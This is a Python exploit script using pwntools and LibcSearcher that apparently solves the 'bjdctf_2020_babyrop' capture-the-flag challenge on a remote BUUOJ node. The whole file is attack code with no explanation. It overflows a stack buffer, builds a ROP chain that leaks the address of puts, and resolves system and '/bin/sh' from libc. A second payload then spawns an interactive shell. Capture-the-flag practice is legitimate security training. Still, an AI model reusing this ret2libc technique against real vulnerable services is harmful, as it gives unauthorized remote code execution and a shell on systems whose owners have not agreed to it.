#! /usr/bin/python


from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',29997)
elf = ELF('./bjdctf_2020_babyrop')
#p = process('./bjdctf_2020_babyrop')

puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
offset = 0x20
vul = 0x040067D
pop_rdi_ret = 0x0000000000400733

payload = 'A' * offset + 'deadbeef' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vul)
p.sendline(payload)
puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))

libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

payload = 'A' * offset + 'deadbeef' + p64(pop_rdi_ret) + p64(sh) + p64(system) + 'deadbeef'
p.sendline(payload)
p.interactive()
